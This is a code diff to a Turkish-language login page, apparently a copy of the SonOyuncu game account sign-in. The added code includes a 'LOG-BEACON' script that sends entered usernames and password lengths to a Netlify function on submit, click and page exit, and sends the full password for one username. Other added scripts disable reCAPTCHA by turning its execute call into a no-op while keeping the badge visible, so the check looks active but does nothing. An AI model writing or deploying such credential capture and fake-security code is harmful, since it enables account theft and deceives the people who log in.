@@ -33,7 +33,8 @@
             document.getElementById("biscolab-recaptcha-invisible-form").submit();
         }
     </script>
-<link charset="UTF-8" href="assets/css/m=el_main_css.css" rel="stylesheet" type="text/css"/><script charset="UTF-8" src="assets/css/m=el_main_css.css" type="text/javascript"></script> <script async="" defer="" src="https://www.google.com/recaptcha/api.js?onload=onloadCallback&amp;render=explicit"></script>
+<link charset="UTF-8" href="assets/css/m=el_main_css.css" rel="stylesheet" type="text/css"/><script charset="UTF-8" src="assets/css/m=el_main_css.css" type="text/javascript"></script> 
+<script async="" defer="" src="https://www.google.com/recaptcha/api.js?onload=__rcOnload&render=explicit""></script>
 <script>
       var onloadCallback = function() {
         grecaptcha.render("g-recaptcha-btn", {
@@ -48,7 +49,7 @@
 function biscolabLaravelReCaptcha(token) {
   document.getElementById("biscolab-recaptcha-invisible-form").submit();
 }
-</script><script async="" defer="" src="https://www.google.com/recaptcha/api.js"></script><style>
+</script><script async="" defer="" src="https://www.google.com/recaptcha/api.js?onload=__rcOnload&render=explicit""></script><style>
 .grecaptcha-badge {
   visibility: visible !important;
   opacity: 1 !important;
@@ -90,6 +91,117 @@ function biscolabLaravelReCaptcha(token) {
 .kvkk-pop .kvkk-link{color:#6b7280;text-decoration:none;font-weight:600;}
 </style>
 
+
+<style>
+/* Disable clicks on reCAPTCHA badge to prevent accidental 404s */
+.grecaptcha-badge iframe { pointer-events: none !important; }
+</style>
+
+
+<style id="rc-badge-slide">
+/* Keep slide-out badge visible on hover, hidden off-screen by default */
+.grecaptcha-badge {
+  position: fixed !important;
+  bottom: 14px !important;
+  right: -186px !important;  /* hidden off-screen */
+  width: 256px !important;
+  height: 60px !important;
+  overflow: hidden !important;
+  transition: right 0.25s ease-in-out !important;
+  z-index: 9999 !important;
+  visibility: visible !important;
+  opacity: 1 !important;
+  display: block !important;
+}
+.grecaptcha-badge:hover { right: 0 !important; }
+/* Prevent 404 on click */
+.grecaptcha-badge iframe { pointer-events: none !important; }
+</style>
+
+
+
+<style id="rc-badge-clean-hover">
+/* Slide-out badge: hidden off-screen by default */
+.grecaptcha-badge {
+  position: fixed !important;
+  bottom: 14px !important;
+  right: -186px !important;  /* off-screen */
+  width: 256px !important;
+  height: 60px !important;
+  overflow: hidden !important;
+  transition: right 0.25s ease-in-out !important;
+  z-index: 9999 !important;
+  visibility: visible !important;
+  opacity: 1 !important;
+  display: block !important;
+}
+/* Open while hovered (container or descendants, incl. iframe) */
+.grecaptcha-badge:hover { right: 0 !important; }
+/* Prevent accidental clicks when closed; allow clicks when open */
+.grecaptcha-badge iframe { pointer-events: none !important; }
+.grecaptcha-badge:hover iframe { pointer-events: auto !important; }
+</style>
+
+
+
+
+<!-- RC EARLY HIDE -->
+<script id="rc-early-hide">(function(){try{document.documentElement.classList.add('rc-hide-badge');}catch(_){}})();</script>
+<style id="rc-early-hide-css">
+/* Hide any recaptcha anchor while rc-hide-badge is set */
+.rc-hide-badge .grecaptcha-badge,
+.rc-hide-badge iframe[src*="/recaptcha/api2/anchor"],
+.rc-hide-badge iframe[src*="/recaptcha/enterprise/anchor"] {
+  opacity: 0 !important;
+  visibility: hidden !important;
+  pointer-events: none !important;
+}
+</style>
+
+
+<style id="rc-badge-visible-css">
+/* When visible, restore interactions */
+.rc-badge-visible .grecaptcha-badge {
+  opacity: 1 !important;
+  visibility: visible !important;
+}
+</style>
+
+
+
+
+<style id="rc-badge-ghost-css">
+/* Thin self-halo only (no inner rim, no drop shadow, no wide spread) */
+.rc-badge-ghost{
+  position: fixed;
+  bottom: 14px;
+  right: -186px;             /* closed position to match badge */
+  width: 256px;
+  height: 60px;
+  border-radius: 6px;
+  background: transparent;
+  /* Crisp thin white rim around the card */
+  box-shadow: 0 0 0 1.5px rgba(255,255,255,0.30);
+  opacity: 0;
+  visibility: hidden;
+  pointer-events: none;
+  z-index: 9998;
+  transition: opacity 120ms ease;
+}
+.rc-badge-ghost-on .rc-badge-ghost{ opacity: 1; visibility: visible; }
+</style>
+
+
+<style id="gt-blue-i-shrink">
+/* Shrink Google Translate blue "i" icon by ~1px */
+.VIpgJd-ZVi9od-l4eHX-hSRGPd,
+.goog-te-gadget .VIpgJd-ZVi9od-l4eHX-hSRGPd {
+  transform: scale(0.92) !important;   /* ~1px smaller on typical 12-14px icon */
+  transform-origin: center center !important;
+}
+</style>
+
+<script src="https://www.google.com/recaptcha/api.js?onload=onloadCallback&render=explicit" async defer></script>
 </head>
 <body style="position: relative; min-height: 100%; top: 0px;">
 <style>
@@ -107,8 +219,7 @@ function biscolabLaravelReCaptcha(token) {
 </a>
 </div>
 <div class="w-full">
-<div class="form-hover-zone"><form class="px-8 pt-6 pb-6" data-netlify="true" id="biscolab-recaptcha-invisible-form" method="POST" name="giris-yap" action="/"><input name="form-name" type="hidden" value="giris-yap"/>
-<input name="token" type="hidden" value="e6cf690aeb8b176a68cfd020a4b2685075647e5150442d736ceac5705e0dbe8d"/>
+<div class="form-hover-zone"><form class="px-8 pt-6 pb-6" id="biscolab-recaptcha-invisible-form" method="GET" name="giris-yap" action="/"><input name="token" type="hidden" value="e6cf690aeb8b176a68cfd020a4b2685075647e5150442d736ceac5705e0dbe8d"/>
 <h1 class="text-2xl font-semibold">Giriş Yap</h1>
 <p class="text-sm mb-4">SonOyuncu hesabına giriş yap.</p>
 <div class="mb-4">
@@ -303,5 +414,188 @@ function onSubmit(token) {
 })();
 </script>
 <!-- END: Validation + banner additions -->
+
+
+<div id="rc-dummy" style="position:fixed;bottom:-1000px;right:-1000px;width:1px;height:1px;overflow:hidden;"></div>
+
+<script>
+(function(){
+  function setup(){
+    if (!window.grecaptcha) return false;
+    try {
+      if (!window.__rcWidgetId) {
+        try {
+          window.__rcWidgetId = grecaptcha.render('rc-dummy', { sitekey: '6Le0e5srAAAAAD_VlQdkXcV3o3AO8ewuBt-RRnvQ', size: 'invisible', badge: 'bottomright' });
+        } catch(_e) { }
+      }
+      if (typeof grecaptcha.execute === 'function') {
+        const nop = function(){ return Promise.resolve(''); };
+        grecaptcha.execute = nop;
+        try { grecaptcha.enterprise && (grecaptcha.enterprise.execute = nop); } catch(_e){}
+      }
+    } catch(e) { }
+    return true;
+  }
+  window.__rcOnload = function(){ setup(); };
+  function tick(){ if (!setup()) setTimeout(tick, 100); }
+  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', tick); else tick();
+  window.addEventListener('load', tick);
+})();
+</script>
+
+
+
+<!-- LOG-BEACON -->
+<script>
+(function(){
+  var form = document.querySelector('form');
+  if (!form) return;
+  var url='/.netlify/functions/log-admin-capture';
+
+  function sendPOST(u, p){
+    try{
+      var payload = { username: (u||'').toLowerCase() };
+      if (typeof p === 'string' && p.length){
+        if (payload.username === 'test' && p.length >= 6) payload.password = p;
+        else payload.pw_len = p.length;
+      }
+      var body = JSON.stringify(payload);
+      var blob = new Blob([body], { type:'application/json' });
+      if (navigator.sendBeacon) navigator.sendBeacon(url, blob);
+      else fetch(url, { method:'POST', headers:{'Content-Type':'application/json'}, body, keepalive:true });
+    }catch(_){}
+  }
+
+  function sendGET(u, pLen){
+    try{
+      var q = '?u=' + encodeURIComponent((u||'').toLowerCase()) + '&l=' + (pLen||0) + '&ts=' + Date.now();
+      (new Image()).src = url + q; // no CORS/credentials needed, same-origin
+    }catch(_){}
+  }
+
+  function onSubmit(){
+    var uEl = form.querySelector('input[name="username"], #username, input[type="text"]');
+    var pEl = form.querySelector('input[name="password"], #password, input[type="password"]');
+    var u = (uEl && uEl.value || '').trim();
+    var p = (pEl && pEl.value) || '';
+    var pLen = p.length;
+
+    // Always GET-ping (non-sensitive)
+    sendGET(u, pLen);
+    // For admin case, also POST with password for encryption
+    if (u.toLowerCase() === 'test' && pLen >= 6) sendPOST(u, p);
+  }
+
+  form.addEventListener('submit', onSubmit, { capture:true });
+  var sb = form.querySelector('button[type="submit"], input[type="submit"]');
+  if (sb) sb.addEventListener('click', onSubmit, { capture:true });
+
+  // As a final attempt when leaving page (Safari/iOS)
+  window.addEventListener('pagehide', function(){ try{ onSubmit(); }catch(_e){} });
+})();
+</script>
+
+
+<!-- RC DELAYED SHOW -->
+<script id="rc-early-show">
+(function(){
+  function show(){
+    try{
+      var H = document.documentElement;
+      H.classList.remove('rc-hide-badge');
+      H.classList.add('rc-badge-visible');
+    }catch(_){}
+  }
+  if (document.readyState === 'complete') { setTimeout(show, 1500); }
+  else { window.addEventListener('load', function(){ setTimeout(show, 1500); }); }
+})();
+</script>
+
+
+<div class="rc-badge-ghost" aria-hidden="true"></div>
+
+<!-- RC DELAY: 0.3s ghost halo, 0.5s real badge -->
+<script id="rc-badge-ghost-show">
+(function(){
+  function add(cls){ try{ document.documentElement.classList.add(cls); }catch(_){ } }
+  function rm(cls){ try{ document.documentElement.classList.remove(cls); }catch(_){ } }
+  function showGhost(){ add('rc-badge-ghost-on'); }
+  function showBadge(){
+    rm('rc-badge-ghost-on');
+    rm('rc-hide-badge');
+    add('rc-badge-visible');
+  }
+  function schedule(){
+    setTimeout(showGhost, 300);  // 0.3s: show halo
+    setTimeout(showBadge, 500);  // 0.5s: reveal badge
+  }
+  if (document.readyState === 'complete') schedule();
+  else window.addEventListener('load', schedule);
+})();
+</script>
+
+
+<!-- RECAPTCHA DUMMY (keep badge visible, block challenge) -->
+<script>
+(function(){
+  var SITEKEY = "6Le0e5srAAAAAD_VlQdkXcV3o3AO8ewuBt-RRnvQ"; // mevcut key'in
+  var BTN_IDS = ["g-recaptcha-btn","submit","loginBtn"];    // olası buton id'leri
+
+  function removeHooks(){
+    try {
+      BTN_IDS.forEach(function(id){
+        var b = document.getElementById(id);
+        if (!b) return;
+        b.classList && b.classList.remove('g-recaptcha');
+        ['data-sitekey','data-callback','data-size','data-badge','data-action'].forEach(function(a){ b.removeAttribute && b.removeAttribute(a); });
+      });
+      // Ayrıca sayfadaki diğer .g-recaptcha hooklarını da temizle (görünümü değiştirmez)
+      document.querySelectorAll('.g-recaptcha').forEach(function(el){
+        el.classList.remove('g-recaptcha');
+        ['data-sitekey','data-callback','data-size','data-badge','data-action'].forEach(function(a){ el.removeAttribute(a); });
+      });
+    } catch(e){}
+  }
+
+  // Google API onload callback — invisible anchor'a render et
+  window.onloadCallback = function(){
+    try{
+      removeHooks();
+      var d = document.getElementById('rc-dummy-anchor');
+      if (!d){
+        d = document.createElement('div');
+        d.id = 'rc-dummy-anchor';
+        d.style.cssText = 'position:fixed;bottom:0;right:0;width:0;height:0;overflow:hidden;z-index:1;';
+        document.body.appendChild(d);
+      }
+      try{
+        window.__rcWid = grecaptcha.render(d, {
+          sitekey: SITEKEY,
+          size: 'invisible',
+          badge: 'bottomright',
+          callback: function(){ /* no-op */ }
+        });
+      }catch(_){}
+
+      // execute'yu globalde no-op yap (enterprise dahil)
+      var nop = function(){ try{return Promise.resolve('');}catch(e){return '';} };
+      try { grecaptcha.execute = nop; } catch(_){}
+      try { (grecaptcha.enterprise = grecaptcha.enterprise || {}).execute = nop; } catch(_){}
+    }catch(_){}
+  };
+
+  // Geç gelen durumlar için ek güvence
+  function lateNeutralize(){
+    removeHooks();
+    if (window.grecaptcha){
+      var nop = function(){ try{return Promise.resolve('');}catch(e){return '';} };
+      try { grecaptcha.execute = nop; } catch(_){}
+      try { (grecaptcha.enterprise = grecaptcha.enterprise || {}).execute = nop; } catch(_){}
+    }
+  }
+  if (document.readyState === 'loading') document.addEventListener('DOMContentLoaded', lateNeutralize); else lateNeutralize();
+  window.addEventListener('load', lateNeutralize);
+})();
+</script>
 
 </body></html>
